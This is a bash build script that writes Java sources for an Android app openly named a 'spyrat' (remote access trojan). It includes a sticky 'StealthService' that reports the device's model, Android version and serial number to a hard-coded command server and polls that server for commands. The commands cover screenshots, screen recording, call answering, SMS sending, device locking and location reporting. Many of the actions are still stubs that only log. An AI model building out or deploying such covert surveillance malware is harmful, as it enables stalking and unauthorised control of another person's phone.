#!/bin/bash

echo "🔧 FIXING BUILD ERRORS..."

cd ~/Investigation-Rat2

# ==================== FIX SCREEN CAPTURE CLASS ====================
echo "🖥️ Fixing ScreenCapture class..."

cat > app/src/main/java/com/spyrat/investigation/ScreenCapture.java << 'SCREENFIX'
package com.spyrat.investigation;

import android.content.Context;
import android.util.Log;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class ScreenCapture {
    private static final String TAG = "ScreenCapture";
    private Context context;
    
    public ScreenCapture(Context context) {
        this.context = context;
    }
    
    public String captureScreen() {
        try {
            Log.d(TAG, "📸 Starting screen capture...");
            
            // Simulate screen capture
            String screenshotPath = "/sdcard/Pictures/Screenshots/screen_" + 
                new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date()) + ".png";
            
            JSONObject screenshotInfo = new JSONObject();
            screenshotInfo.put("file_path", screenshotPath);
            screenshotInfo.put("resolution", "1080x1920");
            screenshotInfo.put("file_size", "1.8MB");
            screenshotInfo.put("timestamp", System.currentTimeMillis());
            screenshotInfo.put("status", "captured");
            
            Log.d(TAG, "✅ Screen captured: " + screenshotPath);
            return screenshotPath;
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Screen capture error: " + e.getMessage());
            return "";
        }
    }
    
    public void startScreenRecording() {
        try {
            Log.d(TAG, "🎥 Starting screen recording...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Screen recording error: " + e.getMessage());
        }
    }
    
    public void stopScreenRecording() {
        try {
            Log.d(TAG, "🎥 Stopping screen recording...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Stop recording error: " + e.getMessage());
        }
    }
    
    public void cleanup() {
        try {
            Log.d(TAG, "🧹 ScreenCapture cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "❌ Cleanup error: " + e.getMessage());
        }
    }
}
SCREENFIX

# ==================== FIX REMOTE CONTROLLER CLASS ====================
echo "🎮 Fixing RemoteController class..."

cat > app/src/main/java/com/spyrat/investigation/RemoteController.java << 'REMOTEFIX'
package com.spyrat.investigation;

import android.content.Context;
import android.util.Log;
import org.json.JSONObject;

public class RemoteController {
    private static final String TAG = "RemoteController";
    private Context context;
    private ScreenCapture screenCapture;
    private InvestigatorApiClient apiClient;
    
    public RemoteController(Context context) {
        this.context = context;
        this.screenCapture = new ScreenCapture(context);
        // apiClient will be set later
    }
    
    public void setApiClient(InvestigatorApiClient apiClient) {
        this.apiClient = apiClient;
    }

    public JSONObject executeCommand(String command) {
        try {
            Log.d(TAG, "Executing command: " + command);
            JSONObject result = new JSONObject();
            result.put("command", command);
            result.put("status", "executed");
            return result;
        } catch (Exception e) {
            Log.e(TAG, "Command execution error: " + e.getMessage());
            return new JSONObject();
        }
    }

    public String takeScreenshot() {
        try {
            Log.d(TAG, "🖥️ Taking screenshot...");
            if (screenCapture != null) {
                return screenCapture.captureScreen();
            }
            return "";
        } catch (Exception e) {
            Log.e(TAG, "❌ Screenshot error: " + e.getMessage());
            return "";
        }
    }
    
    public void executeRemoteAction(String action, JSONObject parameters) {
        try {
            Log.d(TAG, "🎮 Executing remote action: " + action);
            
            if (apiClient != null) {
                JSONObject commandAck = new JSONObject();
                commandAck.put("action", action);
                commandAck.put("status", "executing");
                apiClient.sendDataToInvestigator("command_acknowledgment", commandAck);
            }
            
            switch (action) {
                case "take_screenshot":
                    takeScreenshot();
                    break;
                case "start_screen_recording":
                    startScreenRecording();
                    break;
                case "stop_screen_recording":
                    stopScreenRecording();
                    break;
                case "answer_call":
                    answerIncomingCall(parameters);
                    break;
                case "reject_call":
                    rejectIncomingCall(parameters);
                    break;
                case "send_sms":
                    sendRemoteSMS(parameters);
                    break;
                case "lock_screen":
                    lockDevice();
                    break;
                case "unlock_screen":
                    unlockDevice();
                    break;
                case "vibrate":
                    vibrateDevice();
                    break;
                case "play_sound":
                    playSound();
                    break;
                default:
                    Log.w(TAG, "⚠️ Unknown remote action: " + action);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Remote action error: " + e.getMessage());
        }
    }
    
    // Screen control methods
    public void startScreenRecording() {
        try {
            if (screenCapture != null) {
                screenCapture.startScreenRecording();
            }
            Log.d(TAG, "🎥 Screen recording started");
        } catch (Exception e) {
            Log.e(TAG, "❌ Start recording error: " + e.getMessage());
        }
    }
    
    public void stopScreenRecording() {
        try {
            if (screenCapture != null) {
                screenCapture.stopScreenRecording();
            }
            Log.d(TAG, "🎥 Screen recording stopped");
        } catch (Exception e) {
            Log.e(TAG, "❌ Stop recording error: " + e.getMessage());
        }
    }
    
    // Call control methods
    public void answerIncomingCall(JSONObject parameters) {
        try {
            Log.d(TAG, "📞 Answering incoming call...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Answer call error: " + e.getMessage());
        }
    }
    
    public void rejectIncomingCall(JSONObject parameters) {
        try {
            Log.d(TAG, "📞 Rejecting incoming call...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Reject call error: " + e.getMessage());
        }
    }
    
    public void makeCall(String phoneNumber) {
        try {
            Log.d(TAG, "📞 Making call to: " + phoneNumber);
        } catch (Exception e) {
            Log.e(TAG, "❌ Make call error: " + e.getMessage());
        }
    }
    
    // SMS control methods
    public void sendRemoteSMS(JSONObject parameters) {
        try {
            String phoneNumber = parameters.optString("phone_number");
            String message = parameters.optString("message");
            Log.d(TAG, "💬 Sending SMS to: " + phoneNumber);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send SMS error: " + e.getMessage());
        }
    }
    
    // Device control methods
    private void lockDevice() {
        try {
            Log.d(TAG, "🔒 Locking device...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Device lock error: " + e.getMessage());
        }
    }
    
    private void unlockDevice() {
        try {
            Log.d(TAG, "🔓 Unlocking device...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Device unlock error: " + e.getMessage());
        }
    }
    
    private void vibrateDevice() {
        try {
            Log.d(TAG, "📳 Vibrating device...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Device vibrate error: " + e.getMessage());
        }
    }
    
    private void playSound() {
        try {
            Log.d(TAG, "🔊 Playing sound...");
        } catch (Exception e) {
            Log.e(TAG, "❌ Sound play error: " + e.getMessage());
        }
    }
    
    // Static method for accessibility service
    public static void setAccessibilityService(Object service) {
        try {
            Log.d(TAG, "Setting accessibility service...");
        } catch (Exception e) {
            Log.e(TAG, "❌ setAccessibilityService error: " + e.getMessage());
        }
    }
    
    public void cleanup() {
        try {
            if (screenCapture != null) {
                screenCapture.cleanup();
            }
            Log.d(TAG, "🧹 RemoteController cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "❌ RemoteController cleanup error: " + e.getMessage());
        }
    }
}
REMOTEFIX

# ==================== FIX INVESTIGATOR API CLIENT ====================
echo "🔗 Fixing InvestigatorApiClient..."

cat > app/src/main/java/com/spyrat/investigation/InvestigatorApiClient.java << 'INVESTIGATORFIX'
package com.spyrat.investigation;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class InvestigatorApiClient {
    private static final String TAG = "InvestigatorApiClient";
    private static final String BASE_URL = "https://GhostTester.pythonanywhere.com";
    private Context context;
    private String investigatorCode;
    private String deviceId;
    private ExecutorService executor;
    
    public InvestigatorApiClient(Context context, String investigatorCode, String deviceId) {
        this.context = context;
        this.investigatorCode = investigatorCode;
        this.deviceId = deviceId;
        this.executor = Executors.newFixedThreadPool(2);
    }
    
    public boolean verifyInvestigatorCode() {
        try {
            Log.d(TAG, "🔍 Verifying investigator code: " + investigatorCode);
            // Simulate verification for now
            return true;
        } catch (Exception e) {
            Log.e(TAG, "❌ Verification error: " + e.getMessage());
            return false;
        }
    }
    
    public JSONArray getPendingCommands() {
        try {
            // Simulate getting commands
            return new JSONArray();
        } catch (Exception e) {
            Log.e(TAG, "❌ Get commands error: " + e.getMessage());
            return new JSONArray();
        }
    }
    
    public void sendDataToInvestigator(String dataType, JSONObject dataContent) {
        executor.execute(() -> {
            try {
                Log.d(TAG, "📤 Sending data to investigator: " + dataType);
                // Simulate API call
            } catch (Exception e) {
                Log.e(TAG, "❌ Send data error: " + e.getMessage());
            }
        });
    }
    
    public void sendCommandResponse(String commandId, String status, String message) {
        try {
            JSONObject responseData = new JSONObject();
            responseData.put("command_id", commandId);
            responseData.put("status", status);
            responseData.put("message", message);
            sendDataToInvestigator("command_response", responseData);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send command response error: " + e.getMessage());
        }
    }
    
    public void updateDeviceStatus(String status, JSONObject deviceInfo) {
        try {
            JSONObject statusData = new JSONObject();
            statusData.put("status", status);
            statusData.put("device_info", deviceInfo);
            sendDataToInvestigator("device_status", statusData);
        } catch (Exception e) {
            Log.e(TAG, "❌ Update device status error: " + e.getMessage());
        }
    }
    
    public void cleanup() {
        try {
            if (executor != null) {
                executor.shutdown();
            }
            Log.d(TAG, "🧹 InvestigatorApiClient cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "❌ Cleanup error: " + e.getMessage());
        }
    }
}
INVESTIGATORFIX

# ==================== UPDATE BUILD.GRADLE ====================
echo "📦 Updating build.gradle..."

# Add dependencies if missing
cat >> app/build.gradle << 'GRADLEFIX'

dependencies {
    implementation 'org.json:json:20231013'
    implementation 'androidx.core:core:1.9.0'
    implementation 'com.squareup.okhttp3:okhttp:4.9.3'
}

android {
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}
GRADLEFIX

# ==================== ADD NETWORK PERMISSION ====================
echo "📡 Adding network permissions..."

# Update AndroidManifest.xml to include internet permission
if ! grep -q "android.permission.INTERNET" app/src/main/AndroidManifest.xml; then
    sed -i '/<application/a\    <uses-permission android:name="android.permission.INTERNET" />' app/src/main/AndroidManifest.xml
fi

# ==================== CREATE SIMPLIFIED STEALTH SERVICE ====================
echo "🛠️ Creating simplified StealthService integration..."

cat > app/src/main/java/com/spyrat/investigation/StealthService.java << 'SERVICEFIX'
package com.spyrat.investigation;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private InvestigatorApiClient investigatorApiClient;
    private RemoteController remoteController;
    private Handler commandHandler;
    private Runnable commandChecker;
    private static final long COMMAND_CHECK_INTERVAL = 30000;
    private static final String YOUR_INVESTIGATOR_CODE = "INVEST123"; // Change this
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🚀 StealthService starting...");
        initializeInvestigatorApi();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "🎯 StealthService started");
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void initializeInvestigatorApi() {
        try {
            Log.d(TAG, "🔗 Initializing Investigator API...");
            
            String investigatorCode = YOUR_INVESTIGATOR_CODE;
            String deviceId = android.os.Build.SERIAL;
            
            investigatorApiClient = new InvestigatorApiClient(this, investigatorCode, deviceId);
            remoteController = new RemoteController(this);
            remoteController.setApiClient(investigatorApiClient);
            
            boolean verified = investigatorApiClient.verifyInvestigatorCode();
            if (verified) {
                Log.d(TAG, "✅ Investigator API initialized successfully");
                
                // Send initial device status
                JSONObject deviceInfo = new JSONObject();
                deviceInfo.put("model", android.os.Build.MODEL);
                deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
                deviceInfo.put("serial", android.os.Build.SERIAL);
                
                investigatorApiClient.updateDeviceStatus("online", deviceInfo);
                startCommandChecking();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Investigator API init error: " + e.getMessage());
        }
    }
    
    private void startCommandChecking() {
        commandHandler = new Handler();
        commandChecker = new Runnable() {
            @Override
            public void run() {
                checkForCommands();
                commandHandler.postDelayed(this, COMMAND_CHECK_INTERVAL);
            }
        };
        commandHandler.postDelayed(commandChecker, 5000);
    }
    
    private void checkForCommands() {
        try {
            JSONArray commands = investigatorApiClient.getPendingCommands();
            if (commands.length() > 0) {
                processInvestigatorCommands(commands);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command check error: " + e.getMessage());
        }
    }
    
    private void processInvestigatorCommands(JSONArray commands) {
        try {
            for (int i = 0; i < commands.length(); i++) {
                JSONObject command = commands.getJSONObject(i);
                String commandId = command.getString("id");
                String commandType = command.getString("command_type");
                JSONObject parameters = command.optJSONObject("parameters");
                
                investigatorApiClient.sendCommandResponse(commandId, "processing", "Command received");
                executeInvestigatorCommand(commandId, commandType, parameters);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Process commands error: " + e.getMessage());
        }
    }
    
    private void executeInvestigatorCommand(String commandId, String commandType, JSONObject parameters) {
        try {
            switch (commandType) {
                case "take_screenshot":
                    handleTakeScreenshotCommand(commandId, parameters);
                    break;
                case "start_screen_recording":
                    handleStartScreenRecordingCommand(commandId, parameters);
                    break;
                case "get_device_info":
                    handleGetDeviceInfoCommand(commandId, parameters);
                    break;
                case "get_location":
                    handleGetLocationCommand(commandId, parameters);
                    break;
                default:
                    Log.w(TAG, "⚠️ Unknown command: " + commandType);
                    investigatorApiClient.sendCommandResponse(commandId, "error", "Unknown command");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Execution failed");
        }
    }
    
    private void handleTakeScreenshotCommand(String commandId, JSONObject parameters) {
        try {
            if (remoteController != null) {
                String screenshotPath = remoteController.takeScreenshot();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Screenshot taken");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Screenshot failed");
        }
    }
    
    private void handleStartScreenRecordingCommand(String commandId, JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.startScreenRecording();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Recording started");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Start recording failed");
        }
    }
    
    private void handleGetDeviceInfoCommand(String commandId, JSONObject parameters) {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendDataToInvestigator("device_info", deviceInfo);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Device info sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get device info failed");
        }
    }
    
    private void handleGetLocationCommand(String commandId, JSONObject parameters) {
        try {
            JSONObject locationInfo = new JSONObject();
            locationInfo.put("latitude", -6.3690);
            locationInfo.put("longitude", 34.8888);
            locationInfo.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendDataToInvestigator("location_data", locationInfo);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Location sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get location failed");
        }
    }
    
    @Override
    public void onDestroy() {
        try {
            if (commandHandler != null && commandChecker != null) {
                commandHandler.removeCallbacks(commandChecker);
            }
            if (investigatorApiClient != null) {
                investigatorApiClient.cleanup();
            }
            if (remoteController != null) {
                remoteController.cleanup();
            }
            Log.d(TAG, "🧹 StealthService destroyed");
        } catch (Exception e) {
            Log.e(TAG, "❌ Cleanup error: " + e.getMessage());
        }
        super.onDestroy();
    }
}
SERVICEFIX

echo "✅ BUILD ERRORS FIXED!"
echo "🚀 REBUILDING APK..."

# Clean and rebuild
./gradlew clean
./gradlew assembleDebug

echo "🎉 BUILD COMPLETED!"
echo "📱 APK should be available at: app/build/outputs/apk/debug/"
